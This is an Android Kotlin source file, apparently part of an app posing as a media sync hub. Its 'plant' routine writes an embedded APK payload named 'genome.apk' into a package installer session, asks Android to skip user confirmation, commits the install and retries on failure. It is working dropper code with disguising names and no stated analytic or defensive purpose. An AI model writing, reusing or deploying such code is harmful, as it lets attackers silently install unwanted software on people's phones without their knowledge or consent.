package com.sync.media.hub

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller

internal object Quail {

    fun plant(ctx: Context, genome: ByteArray, attempt: Int = 0) {
        try {
            val pi     = ctx.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)

            if (android.os.Build.VERSION.SDK_INT >= 31) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }

            val sid     = pi.createSession(params)
            val session = pi.openSession(sid)

            session.openWrite("genome.apk", 0, genome.size.toLong()).use { out ->
                out.write(genome)
                session.fsync(out)
            }

            val callbackIntent = Intent(ctx, Ibis::class.java).apply {
                putExtra("att", attempt)
            }
            val pending = PendingIntent.getBroadcast(
                ctx, sid, callbackIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )

            session.commit(pending.intentSender)
            session.close()
        } catch (e: Exception) {
            if (attempt < 2) {
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    plant(ctx, genome, attempt + 1)
                }, 1500L)
            }
        }
    }
}
